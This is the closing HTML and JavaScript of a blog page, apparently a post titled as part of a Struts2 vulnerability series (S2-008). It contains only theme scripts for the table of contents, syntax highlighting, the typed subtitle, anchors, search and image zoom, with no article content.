        var tocLimMin = $('#toc-start').offset().top - navHeight;
        var scroH = document.body.scrollTop + document.documentElement.scrollTop;

        if (tocLimMin <= scroH && scroH <= tocLimMax) {
          toc.css({
            'display': 'block',
            'position': 'fixed',
            'top': navHeight,
          });
        } else if (scroH <= tocLimMin) {
          toc.css({
            'position': '',
            'top': '',
          });
        } else if (scroH > tocLimMax) {
          toc.css('display', 'none');
        }
      });
      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '.post-content',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc > p').css('visibility', 'visible');
      }
      var offset = boardCtn.css('margin-right')
      $('#toc-ctn').css({
        'right': offset
      })
    });
  </script>







  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




<!-- Plugins -->



  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
  <script>
    $(document).ready(function () {
      $('pre').addClass('prettyprint  linenums');
      prettyPrint();
    })
  </script>



  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "struts2系列漏洞 S2-008&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      getSearchFile(path);
      this.onclick = null
    }
  </script>



  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
  <script>
    $("#post img:not(.no-zoom img, img[no-zoom])").each(
      function () {
        var element = document.createElement("a");
        $(element).attr("data-fancybox", "images");
        $(element).attr("href", $(this).attr("src"));
        $(this).wrap(element);
      }
    );
  </script>












</body>
</html>
